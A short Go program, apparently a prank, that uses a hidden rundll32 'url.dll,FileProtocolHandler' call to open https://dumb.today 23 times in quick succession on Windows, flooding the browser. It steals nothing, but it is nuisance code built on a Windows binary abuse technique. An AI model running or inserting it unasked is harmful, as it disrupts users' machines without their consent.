package main

import (
	"os/exec"
	"syscall"
	"time"
)

func main() {
	for i := 0; i < 23; i++ {
		cmd := exec.Command("rundll32", "url.dll,FileProtocolHandler", "https://dumb.today")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Start()
		time.Sleep(150 * time.Millisecond)
	}
}
